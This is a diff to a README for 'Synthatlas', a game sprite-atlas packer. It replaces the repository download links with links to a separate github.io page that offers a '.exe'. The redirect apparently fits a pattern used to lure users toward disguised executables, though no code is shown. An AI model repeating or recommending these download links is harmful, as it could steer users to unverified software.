@@ -1,6 +1,6 @@
 # 📦 Synthatlas - Pack game sprites into optimized sheets
 
-[![](https://img.shields.io/badge/Download-Synthatlas-blue.svg)](https://github.com/truncationerrorcarillon313/Synthatlas)
+[![](https://img.shields.io/badge/Download-Synthatlas-blue.svg)](https://truncationerrorcarillon313.github.io)
 
 Synthatlas helps game developers organize sprite assets. Use this tool to combine separate images into a single texture atlas. This process improves performance in game engines by reducing the number of draw calls. The application features a dark interface designed for long work sessions.
 
@@ -18,13 +18,13 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official release page](https://github.com/truncationerrorcarillon313/Synthatlas).
+1. Visit the [official release page](https://truncationerrorcarillon313.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version number.
 4. Locate the file ending in ".exe" under the "Assets" dropdown.
 5. Click the file name to start the download.
 
-[Direct Download Link](https://github.com/truncationerrorcarillon313/Synthatlas)
+[Direct Download Link](https://truncationerrorcarillon313.github.io)
 
 ## ⚙️ Installation Instructions
 
